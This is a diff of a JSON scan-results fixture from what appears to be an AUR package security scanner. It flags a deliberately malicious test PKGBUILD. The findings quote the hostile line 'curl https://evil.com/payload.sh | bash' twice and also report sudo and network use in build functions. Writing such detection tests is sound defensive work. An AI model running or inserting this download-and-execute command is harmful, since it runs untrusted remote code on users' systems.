@@ -9,7 +9,7 @@
       "title": "Curl pipe to shell",
       "description": "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/curl-bash/PKGBUILD",
+        "file": "tests/fixtures/malicious/curl-bash/PKGBUILD",
         "line": 15,
         "column": 5,
         "snippet": "    curl https://evil.com/payload.sh | bash"
@@ -27,7 +27,7 @@
       "title": "Fetches and runs code from https://evil.com/payload.sh",
       "description": "This package downloads and executes code from https://evil.com/payload.sh at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/curl-bash/PKGBUILD",
+        "file": "tests/fixtures/malicious/curl-bash/PKGBUILD",
         "line": 15,
         "column": null,
         "snippet": "curl https://evil.com/payload.sh | bash"
@@ -48,7 +48,7 @@
       "title": "Sudo usage in package()",
       "description": "Function 'package' uses sudo, which should never be needed in PKGBUILDs",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/curl-bash/PKGBUILD",
+        "file": "tests/fixtures/malicious/curl-bash/PKGBUILD",
         "line": 18,
         "column": null,
         "snippet": null
@@ -66,7 +66,7 @@
       "title": "Network access in build function",
       "description": "Function 'build' contains network access command 'curl'",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/curl-bash/PKGBUILD",
+        "file": "tests/fixtures/malicious/curl-bash/PKGBUILD",
         "line": 13,
         "column": null,
         "snippet": null
@@ -85,7 +85,7 @@
       "title": "No sources with build function",
       "description": "Package has build() function but no source array",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/curl-bash/PKGBUILD",
+        "file": "tests/fixtures/malicious/curl-bash/PKGBUILD",
         "line": null,
         "column": null,
         "snippet": null
@@ -96,8 +96,8 @@
     }
   ],
   "scanned_files": [
-    "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/curl-bash/PKGBUILD"
+    "tests/fixtures/malicious/curl-bash/PKGBUILD"
   ],
-  "timestamp": "2026-06-15T01:57:16.698707464Z",
-  "scan_duration_ms": 2
+  "timestamp": "2026-06-15T10:43:30.327334633Z",
+  "scan_duration_ms": 5
 }
